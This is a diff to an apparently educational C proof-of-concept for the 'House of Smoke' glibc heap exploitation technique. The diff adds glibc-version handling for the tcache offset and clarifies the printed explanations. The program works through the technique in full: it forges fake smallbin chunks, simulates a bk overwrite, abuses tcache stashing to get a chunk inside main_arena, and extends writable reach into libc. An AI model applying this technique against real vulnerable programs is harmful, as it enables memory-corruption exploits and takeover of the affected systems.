@@ -31,28 +31,40 @@
 #include <assert.h>
 #include <stdio.h>
 #include <unistd.h>
+#include <gnu/libc-version.h>
 
 #define ALLOC_SIZE 0x220
 
 int main(){
 	//initialize tcache and calculate where it is, we do it now for the 
-	//sake of simplicity because printfs call malloc make 
+	//sake of simplicity because printfs call malloc and make 
 	//the heap layout complicated
 	char *init = malloc(0x10);
 	free(init);
 	//ASSUMING HEAP LEAK TO CALCULATE WHERE TCACHE IS
-	char *tcache = init - 0x10 - 0x240;
-	//making it point to tcache entry of the size we are 
-	//going to work with + 0x10 , this is so that we allocate
-	//from a different tcache that the one holding victim 
-	//as the one holding victim has issues in some ubuntu builds
-	tcache += 0x40 + (int)((ALLOC_SIZE+0x10)/0x10 - 1)*8 ;
+	//older glibc version had a smaller tcache structure due to 
+	//using char for entry count instead of uint16
+	//this could be simplified to simply - 0x210 + ... 
+	//but this keep the distinction clear 
+	int version = atoi(&gnu_get_libc_version()[2]);
+	char * tcache = NULL;
+	if (version < 30) {
+		tcache = init - 0x10 - 0x240;
+		//this gives us the tcache entry of the size 0x10
+		//larger than victim which is the tcache entry we will 
+		//target 
+		tcache += 0x40 + (int)((ALLOC_SIZE+0x10)/0x10 - 1)*8 ;
+	}
+	else {
+		tcache = init - 0x10 - 0x280;
+		tcache += 0x80 + (int)((ALLOC_SIZE+0x10)/0x10 - 1)*8 ;
+	}
 
 	printf("This PoC demonstrates the House of Smoke .\n\n");
 	printf("This attack allows an attacker to return a chunk within\n");
-	printf("the main arena whithout prior libc leak ,assuming read/write\n");
-	printf("capability of the allocated chunk , this allows for both\n");
-	printf("obtaining a leak and controling the writable libc reagion\n");
+	printf("the main arena whithout prior libc leak ,assuming the\n");
+	printf("attacker can read/write allocated chunks, this allows for both\n");
+	printf("obtaining a libc leak and controling the writable libc reagion\n");
 	printf("after our foothold in the arena , which is a smallbin\n\n");
 
 
@@ -81,16 +93,20 @@ int main(){
 	char *victim = malloc(0x410 + ALLOC_SIZE);
 
 	//this is a chunk we put in tcache then  we overwrite it with bin address
-	printf("\n\nAllocating a chunk of victim size + 0x10\n");
-	printf("\n\nwe will overwrite this chunk with bin address\n");
+	printf("\n\nAllocating a tache_chunk of victim size + 0x10\n");
+	printf("\n\nwe will overwrite this chunk in its tcache entry with the smallbin address\n");
 	char *tcache_chunk = malloc(ALLOC_SIZE+0x10);
 	//to avoid consolidation with top
 	printf("\n\nAllocating a guard chunk to avoid consolidatin with the top chunk\n");
 	char *guard = malloc(0x1000);
 	//put in tcache 
+	printf("\n\nfreeing tcache_chunk , it will be put in the tcache entry corresponding\n");
+	printf("to victim size + 0x10 , our goal now is to overwrite the entry and put a bin\n");
+	printf("address instead of this chunks' address.");
 	free(tcache_chunk);
 	//put victim in unsorted bin
-	printf("\n\nFreeing victim\n");
+	printf("\n\nFreeing victim , it will be put in the unsorted bin\n");
+	printf("victim size now is desired_size + 0x410\n");
 	free(victim);
 	//allocate a chunk that will be cut from victim 
 	//the size of the remainder is ALLOC_SIZE
@@ -101,7 +117,7 @@ int main(){
 	printf("\n\nUpdating the victim pointer , since it advanced by 0x410\n");
 	victim =  trim_victim + 0x410 ;
 	//the victim including metadata
-	printf("\n\nInitializing victim_chuck with victim - 0x10 bytes to account for metadata\n");
+	printf("\n\nInitializing victim_chunk with victim - 0x10 bytes to account for metadata\n");
 	char **victim_chunk = (char **)victim-2;
 
 	//sort victim into the small bin
@@ -114,9 +130,9 @@ int main(){
 	char *smallbin = victim_chunk[3];
 
 	printf("\n\nConstructing a fake list of chunks in the buffer we used for trimming\n");
-	printf("victim , every item in this list is a chunk of size 0x10 that has and fd\n ");
-	printf("poiting to the chuck just before it and and fd field\n");
-	printf("the list is of size 6 , 1 less than tcache\n");
+	printf("victim , every item in this list is a chunk of size 0x10 that has a bk\n ");
+	printf("poiting to the chunk just before it and and fd field\n");
+	printf("the list is of size 6 , 1 less than tcache size\n");
 	
 	//create a fake freelist on the heap , we can use 
 	//the trim result for that
@@ -126,33 +142,33 @@ int main(){
 		freelist[i][3] = (char*) freelist[i+1];
 	}
 	printf("\n\nTo bypass the smallbin corruption check , we make the fd field of the\n");
-	printf("first element in the list point to victim_chunk");
+	printf("first element in the list point to victim_chunk\n");
 	//to bypass the smallbin fd check
 	freelist[0][2] = (char *) victim_chunk;
 
 
 	printf("\n\nMaking the bk field of the last element of the fake list point to the\n");
-	printf("tcache bin(-0x10 since the write will be to the fd field )\n");
-	printf("corresponding to the size of victim\n");
+	printf("tcache bin(-0x10 since the write will be to the fd field at offset 0x10)\n");
+	printf("corresponding to the size of victim + 0x10(the one that has tcache_chunk)\n");
 	//the address of the smallbin will be written to 
 	//(freelist[6]->bk)->fd 
 	freelist[6][3] = (void*)tcache-0x10;
 
 	printf("\n\nSimulating a vulnerability that lets us write the address of head of");
 	printf("the list to victim bk now we have :\n");
-	printf("victim-bk->6 linked fake chunks-bk->tcache");
+	printf("victim-bk->6 linked fake chunks-bk->tcache entry of tcache_chunk");
 	//------------VULNERABILITY-----------
 	victim_chunk[3] = (char *)freelist[0]; 
 	//------------------------------------
 
 	//this allocates victim and starts filling tcache with chunks from
 	//our freelist 
-	printf("\n\nAllocating a chunk of victim size , this will trigger a tcach stashing\n");
+	printf("\n\nAllocating a chunk of victim size , this will trigger a tcache stashing\n");
 	printf("from the smallbin holding victim , in the process of putting the last chunk\n");
-	printf("of the fake list the address of the smallbin just before the one containing\n");
-	printf("victim will be written to the tcache head of the tcache entry of tcache_chunk");
-	printf("and after it the last fake chunk will inserted to tcache entry \n");
-	printf(" of victim , for clarity here is the code that does this : \n");
+	printf("of the fake list in the tcache ,the address of the smallbin just before the \n");
+	printf("one containing victim will be written to the tcache head of the tcache entry\n");
+	printf("of tcache_chunk and after it the last fake chunk will inserted to tcache entry\n");
+	printf("corresponding to victim size, for clarity here is the code that does this : \n");
 	printf("\nbin->bk = bck;\nbck->fd = bin;\ntcache_put (tc_victim, tc_idx);\n\n");
 	char *trigger = malloc(ALLOC_SIZE);
 
@@ -170,7 +186,7 @@ int main(){
 	printf("\n\nAssuming the attacker can read chunk , allocated[0] is a libc address\n");
 	printf("of the bin right before the one that we allocated\n");
 	printf("(this is because the bin is an incomplete malloc chunk strcuture)\n");
-	printf("that only has the fd/bk half , and so by holding the address of the bin\n");
+	printf("that only has the fd/bk fields , and so by holding the address of the bin\n");
 	printf("right before it in its fd/bk ,it would be point to itself as a pseudo-chunk)\n");
 	printf("this is why the allocated address is of the one before the bin corresponding\n");
 	printf("to victime despite the code writing the 'bin' address\n");
@@ -190,11 +206,11 @@ int main(){
 	printf("we will be able to allocate writable libc space even after the arena\n");
 	printf("for this PoC we will be trying to go beyond the stdout FILE structure\n");
 
-	printf("\n\nTo do the expansion we do the following operations in a loop :\n");
+	printf("\n\nTo do the expansion we do the following operations :\n");
 	printf("make the bk/fd of bin we allocated point to an address near of the area\n");
 	printf("we allocated inside the arena , then at that address we construct a fake chunk\n");
 	printf("whose fd/bk point back to the bin we allocated , to malloc this looks like \n");
-	printf("the fake chunk we created is a normal chunk in the bin we allocated \n");
+	printf("the fake chunk we created is a normal chunk in the allocated bin\n");
 	printf("we can do this because we control the bin contents which are the source of\n");
 	printf("truth in this situation, then we can just allocate the new chunk and that\n");
 	printf("will give use a new reach further in libc space.\n");
@@ -244,6 +260,9 @@ int main(){
 		//allocating at bin2-0x10
 		expand = malloc(ALLOC_SIZE - 0x10);
 		//sanity check
+		//also avoids infinite loop , since as long as we allocate 
+		//futher in libc space the loop will end quickly , if not 
+		//it will crash anyway
 		assert((long)expand == (long)bin2+0x10);
 		//now that we have bin2 ,restore state
 		for (int j = 0 ; j < 4 ; j++){
